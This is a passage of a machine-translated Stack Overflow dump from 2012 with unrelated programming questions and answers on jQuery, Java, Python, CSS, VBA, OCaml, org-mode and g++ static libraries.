> 时间：2012-08-05T22:09:02.073

如果使用内联单击处理程序将对单击项的引用传递给您的函数：

```
onclick="add_fav(this);" 
```

然后：

```
function add_fav(btn)
{   
   jQuery.ajax({       
      url: 'addfav.php',
      type: 'POST',
      data: {'id':jQuery(btn).closest("div").attr("id"),is_ajax: 1},
      success: function(html) {
        jQuery('#button').removeClass('before');
        jQuery('#button').addClass('after');
        jQuery('#button').attr('disabled', 'disabled');
      }, 
      error: function() {
        jQuery('#error').html('<div>Error! Unable to add food item.</div>');
      }
    });
} 
```

在 inline 属性`this`中确实引用了 clicked 元素，但不在您正在调用的函数中（除非您采取措施使用`.call()`or `.apply()`）。

但是，我建议使用 jQuery 绑定事件处理程序：

```
jQuery("input.before").click(function(){
   jQuery.ajax({       
      url: 'addfav.php',
      type: 'POST',
      data: {'id':jQuery(this).closest("div").attr("id"),is_ajax: 1},
      success: function(html) {
        jQuery('#button').removeClass('before');
        jQuery('#button').addClass('after');
        jQuery('#button').attr('disabled', 'disabled');
      }, 
      error: function() {
        jQuery('#error').html('<div>Error! Unable to add food item.</div>');
      }
    });
}); 
```

...然后 jQuery 确保`this`设置正确，并且您不需要内联 onclick。将上述内容放在 document.ready 处理程序或按钮之后出现的脚本块中（例如，在正文的末尾）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-05T22:10:26.933

将元素作为参数传递给函数，以便您可以在函数中使用它。`onclick="add_fav(this);"`

```
<script>
function add_fav(element)
{   
jQuery.ajax({       
      url: 'addfav.php',
      type: 'POST',
      data: {'id':jQuery(element).closest("div").attr("id"),is_ajax: 1},
      success: function(html) {
        jQuery('#button').removeClass('before');
        jQuery('#button').addClass('after');
        jQuery('#button').attr('disabled', 'disabled');
      }, 
      error: function() {
        jQuery('#error').html('<div>Error! Unable to add food item.</div>');
      }
    });
}
</script> 
```

如果您仍然想`this`在功能中使用，您可以使用[`function.call()`](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Function/call)，`onclick="add_fav.call(this);"`并使用`add_fav`您拥有的方式。

# javascript - 检测 iPhone 网络浏览器的 Javascript

> ID：11820425
> 
> 赞同：4
> 
> 时间：2012-08-05T22:02:18.363
> 
> 标签：javascript

我正在寻找一种方法来检测 iPhone 是否访问了页面。

我基本上在寻找一种方法来阻止除 iPhone 之外的所有人查看特定网页。

就像是...

如果 Browser !=iPhone 则退出；

这可能使用Javascript吗？

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-08-05T22:09:35.727

```
if (navigator.userAgent.toLowerCase().indexOf("iphone") ==-1) 
  location.replace("goaway.html"); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-05T22:07:13.930

```
if(navigator.userAgent.match(/iPhone/i)) {
   ...
} 
```

虽然我建议你在加载 DOM 之前这样做，例如使用 PHP：

```
<?php
  if(strstr($_SERVER['HTTP_USER_AGENT'],'iPhone')) {

  }
?> 
```

# ios - 使用 3rd 方库向 Apple 提交二进制文件

> ID：11820429
> 
> 赞同：1
> 
> 时间：2012-08-05T22:03:03.193
> 
> 标签：ios, binary, zip, sharekit

我使用 ShareKit 制作了一个应用程序......当我想压缩二进制文件以将其提交给 Apple 时，我还在文件夹中看到两个库。

我应该将它们全部压缩在一起（.ipa 和两个库）还是应该只提交 .ipa？

似乎两者都可以与应用程序加载器一起使用......

.ipa 文件包含其中之一，但不包含两者。该应用程序在设备上运行良好。

提前致谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-05T22:41:37.163

使用 Xcode 4 的存档功能并通过 Organizer 提交，这样您就不会处理凌乱的 zip 和其他文件夹。那应该可以解决您的问题！

# java - 观察者模式的二叉搜索树和计数器

> ID：11820431
> 
> 赞同：0
> 
> 时间：2012-08-05T22:03:14.897
> 
> 标签：java, design-patterns, binary-search-tree

所以我设计了一个二叉搜索树类。在老师的指导下，树不是由节点组成，而是由其他二叉树组成——它的孩子是通过插入新的二叉树来创建的。我们需要创建一个 Counter 类，它是树大小变化的观察者，我们需要计算“节点”的数量但我不知道如何在每次插入调用时通知...b/ c 如果我通知创建一棵新树——我的“nodeCount”每次在构造函数中都会被重置……有什么想法吗？

这是我的 BST 课

```
 package model;
    import java.util.*;

    public class BinaryTree extends Observable{

Strategy strategy;

int value;
BinaryTree leftChild;
BinaryTree rightChild;

int size;

BinaryTree(){
    value = -1;
    leftChild = null;
    rightChild = null;
}

public BinaryTree(int newValue){
    this.value = newValue;
}

public int getValue(){ return value;}

public Boolean isEmpty(){
    Boolean isEmpty;
    if(this == null)
        isEmpty = true;
    else
        isEmpty = false;
    return isEmpty;
}

public void insert(int newValue){
    if(value == -1){
        this.value = newValue;
        size = 1;
        setChanged();
        notifyObservers(new Integer(size));
        clearChanged();
    }
    else if(newValue < this.value){
            if(leftChild != null){
                leftChild.insert(newValue);
            } else {
                System.out.println("Inserted " + newValue + " to the left of " + value);
                leftChild = new BinaryTree(newValue);
                size = size + 1;
                setChanged();
                notifyObservers(new Integer(size));
                clearChanged();
            }
    } else if (newValue >= this.value){
        if(rightChild != null){
            rightChild.insert(newValue);
        } else {
            System.out.println("Inserted " + newValue + " to the right of " + value);
            rightChild = new BinaryTree(newValue);
            size = size + 1;

            setChanged();
            notifyObservers(new Integer(size));
            clearChanged();
        }
    }

} 
```

}

这是我的柜台课

```
 package model;
    import java.util.*;

    public class Counter implements Observer{
private int size;
public Counter(){
    size = 0;
    System.out.println("Counter created: Size is " + size);
}

public void update(Observable BinaryTree, Object size){
    if(size instanceof Integer){
        size = ((Integer)size).intValue();
        System.out.println("Counter : Size changed to " + size);
    } else {
        System.out.println("Counter: Some other change to the tree");
    }
} 
```

}

这是一些示例输出......一旦创建了新树，计数器就会消失 - 我想我理解这个问题我只是不知道如何解决它......我尝试使用委托观察者，但这只是混淆我更……有什么建议吗？

```
Please enter as many integers as you'd like, hit 'Q' when you are finished.

2
Counter : Size changed to 1
4
Inserted 4 to the right of 2
Counter : Size changed to 2
3
Inserted 3 to the left of 4
5
Inserted 5 to the right of 4
4
Inserted 4 to the left of 5
5
Inserted 5 to the right of 5 
```

这是主要方法

```
 package model;
    import java.io.*; 
    import java.util.*; 

    public class menu {
public static void main(String[] args){
    int integerInput;
    int inputOption;

    BinaryTree myIntTree;
    myIntTree = new BinaryTree();

    Counter sizeObs = new Counter();
    myIntTree.addObserver(sizeObs);

    Scanner userInput = new Scanner(System.in);
    do{

    System.out.println("=======================================");
    System.out.println("     Binary Search Tree Traversal!     ");
    System.out.println("=======================================");
    System.out.println("Options:                               ");
    System.out.println("  1\.  Create a new binary search tree  ");
    System.out.println("  2\.  Quit                             ");
    System.out.println("=======================================");

    inputOption = KeyIn.inInt("Please select an option from the menu: ");

    switch(inputOption){
        case 1:
            System.out.println("You've selected to create a new binary tree." + "\n");
            Scanner scan = new Scanner(System.in);
            //String again;
            String tempInput;
            Boolean repeat = true;
            try{
                System.out.println("Please enter as many integers as you'd like, hit 'Q' when you are finished." + "\n");
                do{

                    tempInput = scan.next();
                    if(!tempInput.equals("Q") && !tempInput.equals("q")){
                        integerInput = Integer.parseInt(tempInput);
                        myIntTree.insert(integerInput);
                        repeat = true;
                    }
                    else
                        repeat = false;

                }while(repeat);

            }catch(InputMismatchException e){}

        break;

        case 2:

            System.out.println("Goodbye!");
            break;
        default:
            System.out.println("Invalid selection.");
            break;              
    }
}while(inputOption != 2);
} 
```

}

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-05T22:11:49.543

据我了解，您正在尝试跟踪主树（起源于主根的树）。但是您应该知道，某些插入是针对此主树的子树（即属于大/主树的节点之一）进行的。

您不会“观察”这些节点（子树）。每次创建新节点时，例如：

```
 leftChild = new BinaryTree(newValue); 
```

您还应该将其添加为观察者（即 Counter 实例）。

问题是，这样一来，您将为每棵树都有一个观察者，并且它们中的每一个都将跟踪不同`size`的，即该树的大小实例变量。

您应该在插入新树时应该更新`size`的类中使用类变量。`BinaryTree`这样所有的计数器都将跟踪相同大小的变量。

# css - Chrome 21 和 1px 的区别很烦人的 bug

> ID：11820439
> 
> 赞同：3
> 
> 时间：2012-08-05T22:04:26.657
> 
> 标签：css, google-chrome

在[这个网站上](http://elclanrs.github.com/jq-idealforms/)，日期选择器在所有浏览器（IE8+、Firefox 14、Chrome 20 和 Opera 12）中都能正确显示，但 Chrome 的最新更新版本 21 似乎引入了一个非常烦人的错误，我无法说出喜欢达尔文到底发生了什么，为什么？

------------ **ALL & Chrome 20** ----------- **Chrome 21 WTH！**------------

![在此处输入图像描述](../Images/30534b954f284bedb3e7cfd730f5840b.png)

知道为什么会这样吗？这个错误是从哪里来的？我尝试使用 devtools 切换每个 css 属性，但似乎没有任何区别。它甚至可以在 IE8 中运行，所以这一定是 Chrome 的错误。

**编辑：** 为了澄清一点，当我定位日期选择器以使其与输入对齐时，日期选择器的上边框与输入的下边框对齐。折叠我`margin-top: -1px`在 CSS 中使用的边框。最新 Chrome 的问题似乎是它在日期选择器和输入之间的空间中增加了一个像素，因此边界不相邻，它们之间的距离甚至在折叠之前就有 1px。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-05T22:12:08.493

我没有永久解决方案，但您可以`margin-top:-2px;`使用`ui-datepicker-div`该浏览器。

不要接受我的回答。这是一个临时解决方案。

PS 无法从这里分析代码，但看起来像 jquery 的 .height() 函数，为该版本提供带边框的高度。

# bash - Bash：awk在结果后返回空间

> ID：11820445
> 
> 赞同：0
> 
> 时间：2012-08-05T22:05:56.203
> 
> 标签：bash

该命令`awk 'END{print NR}' file.log`返回一个整数，但后面有一个空格？我将如何修改该命令，以便在结果后不返回空格？

`awk 'END{print NR}' file.log`获取 的长度`file.log`。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-05T22:08:28.267

尝试`printf`改用：

```
awk 'END{printf NR}' file.log 
```

# python - 有序子集测试

> ID：11820446
> 
> 赞同：5
> 
> 时间：2012-08-05T22:06:02.790
> 
> 标签：python, tuples, subset, itertools

我想测试一个有序集是否是一个更大的有序集的子集。我使用元组和`itertools.combinations`：

```
def subset_test(a, b):
    return a in itertools.combinations(b, len(a)) 
```

例如，

```
>>> subset_test((0, 1, 2), (0, 3, 1, 4, 2))
True
>>> subset_test((0, 1, 2), (0, 3, 2, 4, 1))
False 
```

它可以工作，但是当我测试大元组时速度很慢。

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-08-05T23:11:15.460

您可以简单地使用迭代器来跟踪 B 中的位置

```
>>> A = (0, 1, 2)
>>> B = (0, 3, 1, 4, 2)
>>> b_iter = iter(B)
>>> all(a in b_iter for a in A)
True 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-05T22:18:43.810

这样做的简单方法

```
>>> a = (0, 1, 2)
>>> b = (0, 3, 1, 4, 2)
>>> filter(set(a).__contains__, b) == a
True 
```

为了提高效率使用`itertools`

```
>>> from itertools import ifilter, imap
>>> from operator import eq
>>> all(imap(eq, ifilter(set(a).__contains__, b), a))
True 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-05T22:22:21.323

这应该让你开始

```
>>> A = (0, 1, 2)
>>> B = (0, 3, 1, 4, 2)
>>> b_idxs = {v:k for k,v in enumerate(B)}
>>> idxs = [b_idxs[i] for i in A]
>>> idxs == sorted(idxs)
True 
```

如果列表推导抛出 a `KeyError`，那么显然答案也是`False`

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-05T22:41:04.397

这应该很快，但我有一个更快的想法，我希望尽快完成：

```
def is_sorted_subset(A, B):
    try:
      subset = [B.index(a) for a in A]
      return subset == sorted(subset)
    except ValueError:
      return False 
```

更新：这是我承诺的更快的。

```
def is_sorted_subset(A, B):
  max_idx = -1
  try:
    for val in A:
      idx = B[max_idx + 1:].index(val)
      if max(idx, max_idx) == max_idx:
        return False
      max_idx = idx
  except ValueError:
    return False
  return True 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-08-05T22:51:43.413

这是一种不需要任何散列的线性时间方法（在最长的集合中）。它利用了这样一个事实，因为两个集合都是有序的，所以不需要重新检查集合中较早的项目：

```
>>> def subset_test(a, b):
...     b = iter(b)
...     try:
...         for i in a:
...             j = b.next()
...             while j != i:
...                 j = b.next()
...     except StopIteration:
...         return False
...     return True
... 
```

几个测试：

```
>>> subset_test((0, 1, 2), (0, 3, 1, 4, 2))
True
>>> subset_test((0, 2, 1), (0, 3, 1, 4, 2))
False
>>> subset_test((0, 1, 5), (0, 3, 1, 4, 2))
False
>>> subset_test((0, 1, 4), (0, 3, 1, 4, 2))
True 
```

我很确定这是对的——如果您发现任何问题，请告诉我。

* * *

## 回答 #6

> 赞同：-1
> 
> 时间：2012-08-05T22:56:09.690

What about this?

```
>>> a = (0, 1, 2)
>>> b = (0, 3, 1, 4, 2)
>>> set(a).issubset(set(b))
True 
```

In this example a and b have ordered and unique elements and it checks if a is subset of b. Is this you want?

EDIT:

According to @Marcos da Silva Sampaio: "I want to test if A is a subset of the ordered set B."

It wouldn't be the case of:

```
>>> a = (2, 0, 1)
>>> b = (0, 3, 1, 4, 2)
>>> set(b).issuperset(a)
True 
```

In this case the order of a doesn't matters.

# c# - Visual Studio 是否有任何扩展允许将功能作为任务运行？

> ID：11820450
> 
> 赞同：5
> 
> 时间：2012-08-05T22:06:32.853
> 
> 标签：c#, visual-studio, visual-studio-extensions

我经常有一些我想不时执行的代码，例如种子数据库、删除数据库、从数据库下载一些数据并以一些有趣的方式对其进行整理。所有这些任务都可以在 C# 中表示为独立的函数。

阿拉控制台应用程序：

```
class Program{
      static void Task1(){}
      static void Task2(){}
      static void Main(){
          //Task1();
          //Task2();
      }
} 
```

在这里，我注释掉我不想调用的函数，然后运行我确实想调用的函数。编译并等待结果。

我正在寻找一种方法来简化这个过程。例如，在单元测试中，您可以右键单击一个函数，然后通过一些魔术直接从 Visual Studio 执行该函数。

也许有一个扩展可以做到这一点，但我一直没能找到它。到目前为止，我知道的最好的清理方法是在 LinqPad 中制作片段。但我觉得我应该能够直接从 Visual Studio 执行此操作。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-08-05T22:24:28.027

即使没有运行应用程序，您也始终可以直接在“立即”窗口中执行它们。

例如：

```
?Program.Test1() 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-06T06:55:41.737

[TestDriven.NET](http://testdriven.net/)支持将任意方法作为临时测试运行。它适用于没有参数的静态和实例方法。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-05T22:14:44.840

您可以使用 resharper 并将您的任务创建为单元测试。

或者，您可以将它们编写为宏。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-05T22:24:02.347

添加命令行参数。传入方法的名称，从反射中找到它并调用将是另一种方式。用于装饰方法的属性也将是一件好事。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2016-06-21T03:25:21.357

[您可以使用我的Visual Commander](https://vlasovstudio.com/visual-commander/)扩展来运行命令等功能。

# jquery - 使用带有 GWT 的 jquery 可排序列表

> ID：11820454
> 
> 赞同：0
> 
> 时间：2012-08-05T22:07:05.250
> 
> 标签：jquery, list, gwt, drag, jquery-ui-sortable

我正在构建一个 GWT Web 应用程序，并希望为类似于此的可排序列表实现一些 jquery 代码：http: [//jqueryui.com/demos/sortable/](http://jqueryui.com/demos/sortable/)但实际实现要复杂一些。似乎 GWT 对这类事情没有任何本机支持，这就是为什么我试图加入一些基本的 jquery 代码。

问题是似乎 jquery 事件不会从 GWT 中动态生成的列表项触发。有没有办法解决？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-06T12:43:10.543

我们使用 gwt-dnd 进行拖放，到目前为止它非常稳定。

最接近您需求的演示：http: [//allen-sauer.com/com.allen_sauer.gwt.dnd.demo.DragDropDemo/DragDropDemo.html#InsertPanelExample](http://allen-sauer.com/com.allen_sauer.gwt.dnd.demo.DragDropDemo/DragDropDemo.html#InsertPanelExample)

一般来说，我发现使用其他 GWT 库比混合 jQuery 和 GWT 更可取。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-06T15:16:42.927

eeewwhwh，不要在 gwt 上使用外部 js 库，这会在您的浏览器中创建乱七八糟的代码以及大量内存泄漏。

如果您正在寻找花哨的东西，请查看 GXT，但是对于必须处理非常大的数据阵列的应用程序来说它有点慢。

如果您想自己实现它，那将是一些工作，但最终并非不可能。当您单击选择一个对象时，您需要使对象动态隐藏和显示。然后一旦切换到选中，您将需要根据光标的位置动态更改对象的绝对位置。完成此操作后，您可以在对象容器上添加一个侦听器，以查找鼠标悬停在容器上的时间。从那里您可以再次获取坐标并动态显示对象边界框，以便将对象推到您的可拖动对象周围。

我肯定会使用 gwt-dnd 库来处理大部分问题。

# vba - Excel / VBA：检查单元格引用是否返回 0

> ID：11820455
> 
> 赞同：2
> 
> 时间：2012-08-05T22:07:11.810
> 
> 标签：vba, excel

我编写了一个 VBA 脚本，它应该隐藏引用另一个工作表中空单元格的行。可以这么说，工作表 1 包含单元格 A1，它是空的。工作表 2 的单元格 A1 包含“Sheet1！A1”，但打印 0。我的脚本应该遍历所有行并隐藏包含空引用的行，但似乎没有这样做。如果你能帮助我找出我的错误，那就太好了。到目前为止，这是我的代码：

```
Sub Hide()
Application.ScreenUpdating = False
Dim i As Integer
For i = 1 To 1000
If IsEmpty(Cells(1, i)) Then
Rows(i).EntireRow.Hidden = True
End If
Next i
Range("A1").Select
Application.ScreenUpdating = True
End Sub 
```

我会非常感谢任何形式的帮助。

此致，

亚历克斯

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-05T23:04:38.187

亚历克斯在这里是一种稍微复杂的方法。但它有效:)

**注意**：这仅适用于引用同一工作簿中的工作表或打开的工作簿工作表的公式。

**逻辑**：

1.  此代码识别具有公式的单元格，然后遍历它们
2.  然后在遍历所有具有公式的单元格时，它会检查`.Precedents`该单元格的。这是最棘手的部分。没有简单的方法来获取另一个工作表或工作簿上的那个`.Dependents`或`.Precedents`那个谎言。你可以称之为这个属性的限制。所以我正在使用另一种方法来获得那些:)
3.  获得该单元格的地址后，我将检查它们是否为空，然后根据条件隐藏该单元格。

**代码**

```
Sub Sample()
    Dim ws As Worksheet
    Dim rng As Range, acell As Range, bcell As Range

    '~~> This is the sheet which has the formula
    Set ws = Sheets("Sheet1")

    With ws
        '~~> Get the address of all the cells which have formulas
        Set rng = .Cells.SpecialCells(xlCellTypeFormulas)

        '~~> Loop through the cells
        For Each acell In rng
            If acell.EntireRow.Hidden = False Then
                If acell.Value = 0 Then
                    On Error Resume Next
                        '~~> Clear any precedents/dependent arrows if any
                        .ClearArrows
                        '~~> Show precedents
                        acell.ShowPrecedents
                        '~~> Navigate to the relevant cell in the other worksheet
                        acell.NavigateArrow True, 1
                        '~~> Compare address and name to check if they are not from ws
                        If ActiveCell.Address <> rng.Address Or ActiveCell.Worksheet.Name <> .Name Then
                            Set bcell = Sheets(ActiveCell.Worksheet.Name).Range(ActiveCell.Address)
                            '~~> Check if it not empty
                            If Len(Trim(bcell.Value)) = 0 Then
                                '~~> If empty, hide the row
                                .Rows(acell.Row).EntireRow.Hidden = True
                            End If
                        End If
                        '~~> Clear any precedents/dependent arrows if any
                        .ClearArrows
                        .Activate
                    On Error GoTo 0
                End If
            End If
        Next
    End With
End Sub 
```

**快照**

运行宏之前的工作表 1

![在此处输入图像描述](../Images/d3b37ed71e1beaff3981916bd2521b61.png)

这就是 Sheet 2 的外观

![在此处输入图像描述](../Images/bf0842cdb3d6cf891eaaaca95c4d95d1.png)

这就是 Sheet1 在宏之后的样子

![在此处输入图像描述](../Images/c548edae2ed114eb1649fdd051dc2bb4.png)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-05T23:02:49.447

在循环中使用`Cells(1, i)`意味着您正在沿着第 1 行中的列而不是沿着 A 列中的行工作。我怀疑您想要`Cells(i, 1)`。

由于对`Cells`和的调用`Rows`是不合格的，它们将引用活动表。根据您的描述，两者是否应参考同一张表并不是 100% 清楚。很明显，例如，它`Sheet2!A1`不能为空，因为它包含引用的公式`Sheet1!A1`。

因此，您可能想要检查 上的空单元格，`Sheet1`但实际上隐藏 上的行`Sheet2`。`Worksheets("Sheet1").Cells(i, 1)`这将改变对和的调用`Worksheets("Sheet2").Rows(i)`

如果事情更复杂，并且您需要检查是否为空并隐藏行，`Sheet2`那么您将需要隐藏 A 列中具有零值的所有行（如果任何行`Sheet1`实际上包含零作为value) 或更改公式`Sheet2`以显式处理`Sheet1`.

例如，中的公式`Sheet2!A1`可以是：`=IF(ISBLANK(Sheet1!A1),#N/A,Sheet1!A1)`

然后，您的宏中的检查将是：

```
If IsError(Cells(i, 1).Value) Then
  If (Cells(i, 1).Value = CVErr(xlErrNA)) Then
    Rows(i).EntireRow.Hidden = True
  End If
End If 
```

您可以只使用`IsError`检查，但这可能会隐藏源数据的真正错误（例如除以零）

# org-mode - 在组织模式下格式化日期

> ID：11820458
> 
> 赞同：3
> 
> 时间：2012-08-05T22:07:24.587
> 
> 标签：org-mode

如何在 emacs org-mode 中格式化日期？

例如，在下表中，我希望日期显示为“Aug 29”或“Wed, Aug 29”而不是“<2012-08-29 Wed>”

```
#+ATTR_HTML: border="2" rules="all" frame="border" align="center" cellpadding="6"
|------+------------------+---------+-------|
| Week | Date             | Speaker | Title |
|------+------------------+---------+-------|
|    / | <>               | <>      | <>    |
|    0 | <2012-08-29 Wed> |         |       |
|    2 | <2012-09-05 Wed> |         |       |
|    3 | <2012-09-12 Wed> |         |       |
|    1 | <2012-09-19 Wed> |         |       |
|    4 | <2012-09-26 Wed> |         |       |
|    5 | <2012-10-03 Wed> |         |       |
|    6 | <2012-10-10 Wed> |         |       |
|    7 | <2012-10-17 Wed> |         |       |
|    8 | <2012-10-24 Wed> |         |       |
|    9 | <2012-10-31 Wed> |         |       |
|   10 | <2013-03-07 Thu> |         |       |
|------+------------------+---------+-------|
#+TBLFM: @3$1 = 0::$1 = @-1$1 + 1 ::@3$2 = <Aug 29, 2012>::$2 = @-1$2 + 7 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-05T22:23:14.613

[自定义日期格式](http://orgmode.org/manual/Custom-time-format.html)应该会有所帮助。它将使用您自己的自定义格式显示时间戳。

# ocaml - 什么时候在 OCaml 中创建物理上不同的值？

> ID：11820461
> 
> 赞同：4
> 
> 时间：2012-08-05T22:07:54.963
> 
> 标签：ocaml, object-identity, referenceequals

我试图了解 OCaml 中的物理相等运算符 (`Pervasives.(==)`和`Pervasives.(!=)`) 的含义。

语言手册说表达式`""`是“常量”，而不是“表达式”：

> # [6.5 常数](http://caml.inria.fr/pub/docs/manual-ocaml/manual013.html)
> 
> *常量*::== ...*字符串文字*

但我找不到任何表示常量是单独/预评估或池化的措辞，并且 REPL 表示可变字符串值（谢天谢地）没有被池化。

```
(* a *)  ""          == "";;             (* false *)
(* b *)  "foo"       == "foo";;          (* false *)
(* c *)  ""          == String.copy "";; (* false *)
(* d *)  ()          == ();;             (* true  *)
(* e *)  (42, -42)   == (42, -42);;      (* false *)
(* f *)  ("", 1)     == ("", 1);;        (* false *)
(* g *)  None        == None;;           (* true  *)
(* h *)  (Some None) == (Some None);;    (* false *) 
```

“ [19.3 OCaml 数据类型](http://caml.inria.fr/pub/docs/manual-ocaml/manual033.html#toc144)的表示”部分建议语言规范要求 bools、ints、chars、单位值、简单变体和空列表是无私的。

实现是否必须像上面那样才能成为符合 OCaml 的实现？

兼容的 OCaml 实现是否可以重写指针`b`以指向`a`何时`a = b (* structurally *)`为真，并且两者都是不可变类型的值（或有效的不可变值，如零长度字符串/数组），有时这样做是为了减少一代中可到达的较年轻值的数量GC？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-05T22:39:48.347

当我阅读语言规范时，很少有关于值何时不同的保证。我相信唯一的保证是在[Pervasives 模块](http://caml.inria.fr/pub/docs/manual-ocaml-4.00/libref/Pervasives.html)的文档中：

> 对于可变类型，例如引用、数组、字符串、具有可变字段的记录和具有可变实例变量的对象，当且仅当 e1 的物理修改也影响 e2 时，e1 == e2 为真。在非可变类型上， ( == ) 的行为取决于实现；但是，可以保证 e1 == e2 意味着比较 e1 e2 = 0。

关于 FP 的一个很酷的事情是编译器和运行时可以自由地用不可变的值做任意聪明的事情。所以这个保证是你真正想要的（恕我直言）。

总而言之，是的，运行时或编译器是免费的（同样，恕我直言）以任何它认为有帮助的方式共享（而不是共享）不可变值。

我不会将表示部分解释为语言规范的一部分。它只是当前实现的有用文档。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-13T08:34:36.670

只是一个评论：字符串常量的池化方式与您测试的方式不同：

```
let f () = "foo"
let b = f () == f () (* true *) 
```

如果您改变调用的输出，这确实可能会导致错误`f ()`：这也会影响所有进一步的调用。关于这种行为的共识是可变字符串是一个历史错误（一个应该有一个*不同于*主要字符串类型的可变缓冲区类型，编码选择和连接复杂性应该更重要）并且语义破坏池足够有趣性能方面允许假设字符串常量没有发生突变。如果想避免池化，应该`String.copy`直接在字符串常量上调用 a 。

# css - 创建没有闪烁的定位 CSS3 跨浏览器卡片翻转（z-index / 透视问题？）

> ID：11820465
> 
> 赞同：2
> 
> 时间：2012-08-05T22:08:17.223
> 
> 标签：css, cross-browser, css-transitions

目前试图在我的测试站点上获得一个简单的跨浏览器 3D CSS3 卡片翻转效果。

结果在 Firefox 中运行良好，但在 WebKit 中，图像的一半消失了，并且闪烁了很多。

我已经根据网络上的工作示例检查了代码，例如

[http://developer.apple.com/library/safari/#samplecode/CardFlip/Introduction/Intro.html%23//apple_ref/doc/uid/DTS40007646-Intro-DontLinkElementID_2](http://developer.apple.com/library/safari/#samplecode/CardFlip/Introduction/Intro.html%23//apple_ref/doc/uid/DTS40007646-Intro-DontLinkElementID_2)

由于我在那里找不到困难，我现在怀疑背景的 z-index 位置和卡片的透视值相互对战——尽管我现在无法找出它们之间的相互关系。

这是我使用的 CSS：

'#t02panel' 用作卡片，'#t2front' 和 '#t2back' 是它的两个面。

隐藏#t02back 的背面（这在逻辑上不应该造成伤害，也不是必需的……）可以避免在 Firefox 中闪烁的外观，但对 WebKit 没有好处。

```
 #t02front   {   -webkit-backface-visibility: hidden;    } 
        #t02back    {   -webkit-transform: rotateY (-180deg);   -moz-transform: rotateY(-180deg);   -o-transform: rotateY(-180deg);     transform: rotateY(-180deg);    }        
        #t02front, #t02back {   position:absolute; z-index: 1; box-sizing: border-box; 
                                    -moz-backface-visibility: hidden;   -o-backface-visibility: hidden;     backface-visibility: hidden;    }

        #topic02        #t02panel       {   -webkit-perspective: 600;                               -moz-perspective: 600;                              -o-perspective: 600;                            perspective: 600;
                                            -webkit-box-shadow: 0px 2px 6px rgba(0, 0, 0, 0.5);     -moz-box-shadow: 0px 2px 6px rgba(0, 0, 0, 0.5);    -o-box-shadow: 0px 2px 6px rgba(0, 0, 0, 0.5);  box-shadow: 0px 2px 6px rgba(0, 0, 0, 0.5);
                                            -webkit-transform-style: preserve-3d;                   -moz-transform-style: preserve-3d;                  -o-transform-style: preserve-3d;                transform-style: preserve-3d;
                                            -webkit-transition: -webkit-transform 1s;               -moz-transition: -moz-transform 1s;                 -o-transition: -o-transform 1s;                 transition: transform 1s;
                                            -webkit-transition: all 1.0s linear;                    -moz-transition: all 1.0s linear;                   -o-transition: all 1.0s linear;                 transition: all 1.0s linear;    }
        #topic02:hover  #t02panel       {   -webkit-transform: rotateY(180deg);                     -moz-transform: rotateY(180deg);                    -o-transform: rotateY(180deg);                  transform: rotateY(180deg);     } 
```

任何关于如何让它跨浏览器工作的输入都非常感谢！！！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-06T10:29:12.277

我假设这是一个 WebKit 错误。这是一个解决方法。如果您将以下内容应用于卡片翻转时显示的图像，您将不再看到闪烁：

```
-webkit-transform: translateZ(-1px); 
```

这会将图像在 3D 空间中向后推 1px，从而在前后图像之间产生足够的分离。如果你超过 1px，你可以看到元素是分开的，但 1px 足以不产生影响。

您可以应用`-webkit-transform: translateZ(1px);`到正面图像，但正如您将看到的，它会导致图像变大一点。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-08T14:46:44.270

嗯。在 Z 上将“背面”图像向后移动确实有助于消除闪烁，但并不能解决原来的一半图像在转动过程中完全消失在外部元素背景后面的问题。

还学到了：WebKit（在 Safari 中测试）不喜欢每个变换参数有多个参数。

不得不去

```
 -webkit-transform:  rotateY (-180deg);
    -webkit-transform:  translateZ(-1px); 
```

而不是

```
 -webkit-transform:  rotateY (-180deg) translateZ(-1px); 
```

以创建所需的结果。

# c++ - g ++创建静态库：无法读取符号存档没有索引

> ID：11820470
> 
> 赞同：1
> 
> 时间：2012-08-05T22:09:21.157
> 
> 标签：c++, g++, sdl, static-libraries, unix-ar

我正在尝试使用 g++ 将许多 SDL 实用程序类分组到 C++ 的静态库中。我正在使用 ubuntu linux 11.10 和 gcc 版本 4.6.1 (Ubuntu/Linaro 4.6.1-9ubuntu3)。ar 的版本是 2.21.53.20110810。

由于所有文件都很小，我目前只使用头文件。我提到这一点，以防它与问题有关。此外，大多数标头都使用 -lSDL 编译为目标代码（我不确定这是否正确甚至相关，但无论哪种方式都失败了）。最后，两个不同的类有几个静态成员，在它们自己的文件中定义，以包含在过程的最后步骤中（尝试遵循 ODR）。

问题是，每个文件都被编译成目标代码就好了，然后使用 ar 创建一个存档，但是当我尝试编译主文件并将其链接到我的新库时（就像我正在创建的存档 libDanGfx.a）：

g++ -Wall -ansi -pedantic newmain.cpp -L。-lSDL -lDanGfx

我收到此错误：

./libDanGfx.a：无法读取符号：存档没有索引；运行ranlib添加一个

即使在删除所有档案和目标代码后也会发生这种情况。

